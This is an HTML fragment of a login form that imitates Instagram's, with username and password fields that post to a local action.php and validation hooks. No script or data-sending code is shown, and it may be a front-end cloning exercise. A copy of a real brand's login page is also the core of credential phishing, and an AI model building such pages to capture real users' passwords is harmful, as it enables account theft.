<body>
    <div class="main">
        <form action="/action.php" onsubmit="return validateForm(event)" method="post">
            <div class="form">
                <img class="image" src="logo.png" alt="instagram">
                <input type="text" oninput="onEmailChange(event)" oninput="emailString()" name="user"
                    placeholder="Phone number username or email address">
                <input type="password" oninput="onPasswordChange(event)" name="Passward" placeholder="Password">
                <button class="btn" type="submit" disabled>Log In</button>
                <p>OR</p>

                <p id="validationError" style="color:red" ></p>
                <a href="#">Forgotten your password?</a>
            </div>
        </form>
        <div class="signup">

        </div>
        <p class="par">Get the app.</p>
